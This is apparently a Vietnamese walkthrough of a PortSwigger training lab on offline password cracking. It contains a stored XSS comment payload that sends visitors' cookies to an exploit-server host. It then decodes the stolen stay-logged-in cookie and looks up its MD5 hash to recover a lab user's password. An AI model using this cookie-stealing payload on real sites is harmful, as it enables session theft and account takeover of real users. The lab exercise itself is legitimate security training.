# WriteUp_PortSwigger

# Authentication

<h2>Lab: Offline password cracking</h2>
Đăng nhập vào lab bằng tài khoản cho trước: wiener:peter. Sau đó vào một post bất kì, comment vào bằng payload XSS <code><script>document.location='//exploit-ac071f2a1ef03225c0a90ac401b80031.web-security-academy.web-security-academy.net/'+document.cookie</script></code>
Sau đó truy cập vào server exploit do lab cung cấp sẵn, rồi vào accesslog, ta sẽ thấy:

![image](https://user-images.githubusercontent.com/44827139/158007468-4ff7a879-994f-44ce-beaf-6eeec9791335.png)

Focus vào request có chứa cookie <code>stay-loged-in</code>, ta lấy giá trị rồi decode base 64 thu được: <code>carlos:26323c16d5f4dabff3bb136f2460a943</code>
Sau đó tìm đoạn mã md5 (26323c16d5f4dabff3bb136f2460a943) trên google sẽ ra giá trị trc khi encode của nó là <code>onceuponatime</code>, đây chính là mật khẩu.
![image](https://user-images.githubusercontent.com/44827139/158007617-37e34eee-21b6-4f01-ba31-5ba930de4390.png)
Đăng nhập dùng username và password đã tìm được rồi xóa user là giải được lab.
